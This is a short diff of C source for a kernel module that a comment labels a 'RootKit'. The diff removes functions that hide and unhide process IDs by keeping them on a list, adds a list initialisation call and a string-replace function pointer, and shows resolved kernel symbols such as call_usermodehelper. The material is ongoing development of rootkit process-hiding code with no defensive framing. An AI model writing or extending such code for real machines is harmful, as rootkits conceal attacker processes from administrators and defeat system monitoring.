@@ -68,10 +68,6 @@ mm_segment_t my_get_fs(void);
 void my_set_fs(mm_segment_t seg);
 unsigned int get_kernel_tree(void);
 
-// linked-list
-int hide_pid(pid_t pid);
-int unhide_pid(pid_t pid);
-
 /*
  * Global variables.
  */
@@ -100,6 +96,7 @@ int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res) = 
 void * (*f_memcpy)(void *dest, const void *src, size_t count) = NULL;
 int (*f_memcmp)(const void *cs, const void *ct, size_t count) = NULL;
 int (*f_call_usermodehelper)(char *path, char **argv, char **envp, int wait) = NULL;
+char * (*f_strreplace)(char *s, char old, char new) = NULL;
 
 /*
  * RootKit's functions definitions.
@@ -117,37 +114,7 @@ void kernel_test(void) {
 
 void kernel_init(void) {
 	pinfo("Hello from kernel_init()!\n");
-}
-
-int hide_pid(pid_t nr) {
-	struct pid *pid;
-	
-	pid = f_find_vpid(nr);
-	if (pid) {
-		if (pid_list_find(nr)) {
-			perr("PID %d already hidden.\n", nr);
-		} else {
-			pid_list_push(nr);
-			pinfo("PID %d is hidden.\n", nr);
-			return 0;
-		}
-	} else {
-		perr("PID %d not found.\n", nr);
-	}
-
-	return -1;
-}
-
-int unhide_pid(pid_t nr) {
-	if (pid_list_pop(nr) == nr) {
-		pinfo("PID %d unhidden.\n", nr);
-
-		return 0;
-	} else {
-		perr("PID %d is not hidden.\n", nr);
-	}
-	
-	return -1;
+	pid_list_create();
 }
 
 int pinfo(const char *fmt, ...) {
